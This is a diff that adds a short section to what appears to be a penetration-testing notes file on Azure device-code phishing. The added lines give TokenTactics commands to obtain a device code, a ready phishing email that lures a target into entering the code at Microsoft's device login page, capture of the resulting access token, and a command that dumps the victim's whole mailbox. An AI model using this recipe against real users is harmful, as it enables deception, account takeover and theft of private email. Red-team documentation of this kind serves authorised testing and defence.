@@ -324,6 +324,38 @@ Send-MailMessage -SmtpServer CompanyDomain-com.mail.protection.outlook.com -Subj
 - https://www.offsec-journey.com/post/phishing-with-azure-device-codes
 - https://www.youtube.com/watch?v=GZ_nn0uRLr4
 
+### Example TokenTactics
+- https://github.com/rvrsh3ll/TokenTactics
+
+#### Request Device Code token
+- Copy the Device code
+
+```
+ipmo .\TokenTactics-main\TokenTactics.psd1
+
+Get-AzureToken -Client MSGraph
+```
+
+#### Send device code to the target
+- Email example:
+```
+Dear <USER>,
+
+Use the Code to access the content of the website: https://microsoft.com/devicelogin
+
+Code: <CODE>
+```
+
+#### Capture Access Token
+- Once the user registers trhe device, TokenTactics will capture the token. This is saved in `$response.access_token
+
+#### Post exploitation
+- Example dump mailbox with TokenTactics:
+```
+Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
+AllItems
+```
+
 #### Common application ID's
 ```
 ACOM Azure Website 	23523755-3a2b-41ca-9315-f81f3f566a95
